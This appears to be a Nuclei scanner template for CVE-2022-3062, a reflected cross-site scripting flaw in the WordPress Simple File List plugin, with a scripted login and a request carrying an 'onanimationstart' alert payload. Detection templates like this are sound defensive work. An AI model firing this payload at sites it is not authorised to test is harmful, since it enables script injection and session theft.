http:
- matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(header_2, "text/html")
    - contains(body_2, "ee-simple-file-list")
    - contains(body_2, "onanimationstart=alert(document.domain)//")
    type: dsl
  raw:
  - 'POST /wp-login.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    log={{username}}&pwd={{password}}&wp-submit=Log+In

    '
  - 'GET /wp-admin/?page=ee-simple-file-list&tab=settings&subtab="style=animation-name:rotation+onanimationstart=alert(document.domain)//
    HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2022-3062
info:
  author: r3Y3r53
  classification:
    cpe: cpe:2.3:a:simplefilelist:simple-file-list:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-3062
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.46075
    epss-score: 0.0012
  description: 'The plugin does not escape parameters before outputting them back
    in attributes, leading to Reflected Cross-Site Scripting

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    framework: wordpress
    max-request: 2
    product: simple-file-list
    vendor: simplefilelist
    verified: true
  name: Simple File List < 4.4.12 - Cross Site Scripting
  reference:
  - https://wpscan.com/vulnerability/2e829bbe-1843-496d-a852-4150fa6d1f7a
  - https://nvd.nist.gov/vuln/detail/CVE-2022-3062
  - https://wordpress.org/plugins/simple-file-list/
  - https://github.com/ARPSyndicate/cvemon
  remediation: Fixed in version 4.4.12
  severity: medium
  tags: cve,cve2022,authenticated,wordpress,wp-plugin,wp,wpscan,xss,simple-file-list,simplefilelist
